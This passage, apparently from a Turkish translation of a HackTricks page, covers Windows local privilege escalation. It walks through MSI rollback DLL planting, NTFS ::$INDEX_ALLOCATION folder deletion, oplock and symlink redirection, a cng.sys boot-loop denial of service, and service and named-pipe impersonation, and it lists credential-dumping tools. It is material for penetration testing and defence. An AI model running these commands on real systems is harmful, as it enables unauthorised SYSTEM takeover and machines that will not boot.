    - `.rbs` dosyasını, Windows’a aşağıdakini yaptıran **sahte bir rollback script’iyle** değiştirin:
        - `.rbf` dosyanızı (kötücül DLL) **ayrıcalıklı bir konuma** (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemek.
    - **SYSTEM düzeyinde kötücül payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback işlemini tetikleyin
    - Installer’ın devam etmesi için senkronizasyon event’ine sinyal gönderin.
    - Yüklemeyi bilinen bir noktada **bilerek başarısız kılacak şekilde** `type 19` özel eylemi (`ErrorOut`) yapılandırılmıştır.
    - Bu, **rollback işlemini başlatır**.

- Adım 13: SYSTEM DLL’inizi yükler
    - Windows Installer:
        - Kötücül `.rbs` dosyanızı okur.
        - `.rbf` DLL’inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir konumda kötücül DLL’iniz** vardır.

- Son adım: SYSTEM kodunu çalıştırın
    - Ele geçirdiğiniz DLL’i yükleyen güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
    - **Boom**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Keyfi Dosya Silme/Taşıma/Yeniden Adlandırmadan SYSTEM EoP’ye

Ana MSI rollback tekniği (önceki teknik), **tüm bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya zafiyetiniz yalnızca **keyfi dosya silmeye** izin veriyorsa?

**NTFS internals**’tan yararlanabilirsiniz: her klasörün şu adla gizli bir alternate data stream’i vardır:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **index metadata** bilgisini depolar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream**'ini **silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *file* delete API'sini çağırıyor olsanız bile, **klasörün kendisini siler**.

### Klasör İçeriğini Silmekten SYSTEM EoP'ye
Primitive'iniz rastgele dosya/klasörleri silmenize izin vermiyor, ancak **saldırganın kontrolündeki bir klasörün *içeriğini* silmenize izin veriyorsa** ne olur?

1. Adım 1: Yem klasörü ve dosyası oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu ekleyin: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Ayrıcalıklı bir işlem `file1.txt` dosyasını silmeye çalıştığında, oplock **yürütmeyi duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Adım 3: SYSTEM sürecini tetikle (ör. `SilentCleanup`)
- Bu süreç klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback içinde – silme işlemini yönlendir

- Seçenek A: `file1.txt` dosyasını başka bir yere taşı
    - Bu, oplock'u bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'u zamanından önce serbest bırakır.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştür:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS dahili akışını hedefler — bu akışı silmek klasörü siler.

5. Step 5: Oplock'u serbest bırak
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi junction + symlink nedeniyle aslında şunu siliyordur:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Arbitrary Folder Oluşturmadan Kalıcı DoS'a

**SYSTEM/admin olarak herhangi bir klasör oluşturmanıza** izin veren bir primitive'i exploit edin — **dosya yazamasanız** veya **zayıf izinler ayarlayamasanız** bile.

**Kritik bir Windows driver'ının** adıyla bir **klasör** (dosya değil) oluşturun. Örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode sürücüsüne karşılık gelir.
- **Önceden bu yolu bir klasör olarak oluşturursanız**, Windows gerçek sürücüyü açılışta yükleyemez.
- Ardından Windows, açılış sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü çözümleyemez** ve **çöker veya açılışı durdurur**.
- **Geri dönüş seçeneği yoktur** ve harici müdahale (ör. açılış onarımı veya diske erişim) olmadan **kurtarma mümkün değildir**.

### Ayrıcalıklı log/backup yollarından ve OM symlink’lerinden keyfi dosya üzerine yazma / açılış DoS saldırısına

Bir **ayrıcalıklı servis**, **yazılabilir bir config** dosyasından okuduğu yola log/dışa aktarma verisi yazdığında, bu yolu **Object Manager symlink’leri + NTFS mount point’leri** ile yönlendirerek ayrıcalıklı yazma işlemini keyfi dosya üzerine yazmaya dönüştürebilirsiniz (hatta SeCreateSymbolicLinkPrivilege olmadan bile).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu depolayan config dosyası saldırgan tarafından yazılabilir olmalıdır (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` hedefine bir mount point ve bir OM dosya symlink’i oluşturabilme imkânı (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan ayrıcalıklı bir işlem (log, dışa aktarma, rapor).

**Örnek zincir**
1. Ayrıcalıklı log hedefini öğrenmek için config dosyasını okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Admin olmadan yolu yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component'in log'u yazmasını bekleyin (ör. admin'in "send test SMS" işlemini başlatması). Yazma işlemi artık `C:\Windows\System32\cng.sys` dosyasına yapılır.
4. Bozulmayı doğrulamak için üzerine yazılan hedefi inceleyin (hex/PE parser); yeniden başlatma, Windows'un değiştirilmiş driver yolunu yüklemesine neden olur → **boot loop DoS**. Bu yöntem, privileged bir service'in yazmak üzere açacağı korumalı herhangi bir dosyaya da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopya denenebilir ve böylece bozuk veri için güvenilir bir DoS hedefi oluşturur.



## **High Integrity'den System'e**

### **Yeni service**

Zaten bir High Integrity process içinde çalışıyorsanız, **SYSTEM'e giden yol** yeni bir service oluşturup çalıştırmak kadar kolay olabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir süreçten **AlwaysInstallElevated registry kayıtlarını etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **kurmayı** deneyebilirsiniz.\
[İlgili registry key'leri ve bir _.msi_ paketinin nasıl kurulacağı hakkında daha fazla bilgiye buradan ulaşabilirsiniz.](#alwaysinstallelevated)

### High + SeImpersonate privilege ile System'e geçiş

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token privileges'a geçiş

Bu token privileges'a sahipseniz (muhtemelen bunu zaten High Integrity olan bir süreçte bulacaksınız), SeDebug privilege'ını kullanarak **neredeyse tüm süreçleri** (korunan süreçler hariç) **açabilir**, sürecin token'ını **kopyalayabilir** ve bu token'la **istediğiniz bir süreci oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token privileges'larına sahip SYSTEM olarak çalışan bir süreç seçmek** için kullanılır (_evet, tüm token privileges'larına sahip olmayan SYSTEM süreçleri de bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir** [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, meterpreter tarafından `getsystem` ile privilege escalation yapmak için kullanılır. Teknik, **bir pipe oluşturup ardından o pipe'a yazması için bir service oluşturmayı/kötüye kullanmayı** içerir. Pipe'ı **`SeImpersonate`** privilege'ını kullanarak oluşturan **server**, pipe client'ının (service) token'ını **impersonate edebilir** ve böylece SYSTEM privileges elde edebilir.\
[**Name pipe'lar hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
[**Name pipe'lar kullanarak high integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **süreç tarafından yüklenen** bir dll'i **hijack etmeyi** başarırsanız, bu izinlerle istediğiniz kodu çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır. Ayrıca, dll'lerin yüklendiği klasörlerde **yazma izinlerine** sahip olacağından, bunu bir high integrity süreçten gerçekleştirmek çok daha **kolaydır**.\
**Dll hijacking hakkında daha fazla bilgiyi** [**burada bulabilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e geçiş**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten tüm privileges'lara geçiş

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows local privilege escalation vektörlerini bulmak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP'de kayıtlı oturum bilgilerini çıkarır. Yerel kullanımda -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc açıklarını arar (Watson nedeniyle KULLANILMIYOR)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc açıklarını arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host üzerinde enumeration yapar (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Çok sayıda yazılımdan kimlik bilgilerini çıkarır (github'da önceden derlenmiş exe bulunur)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C#'a aktarılmış sürümü**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (github'da önceden derlenmiş executable bulunur). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderideki bilgilere dayanarak oluşturulmuş araçtır (düzgün çalışması için accesschk gerekmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'ler önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'ler önerir (yerel Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi uygun .NET sürümünü kullanarak derlemeniz gerekir ([buraya bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Privilege Escalation Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetki yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - başvuru sayfası](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT yeni gözde (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Eksiksiz OSCP Rehberi](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Privilege Escalation yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgilerinin şifresini çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgelerinde Kedi-Fare Oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Yetkili Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Açılan Bir Bağlantı: Windows'ta Symbolic Link'lerin Kötüye Kullanımı](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows'ta tehlikeli modül çözümleme](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist zorlukları, çözüldü](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hizmet ikili dosyalarını ele geçirme](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine Hükmedecek Tek Bir I/O Ring: Windows 11'de Tam Okuma/Yazma Exploit Primitive'i](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Privilege Escalation ve Diğer Harika Yöntemler için İstenilen Dosyaları Silme Açığından Yararlanma](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10 Local Privilege Escalation 1-Day Açığı](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u inceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Bir imaj değişikliği nasıl Privilege Escalation'a yol açar?](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Private Key'leri çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Arka Kapı Fabrikalarına Dönüştürme (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Arka Kapı Fabrikalarına Dönüştürme (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Klasörünü Silerek Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEM'e Geri Dönüş Adımlarınızı İzleme](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services paylaşılan bellek offset'leri için Privilege Escalation güvenlik önerisi](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
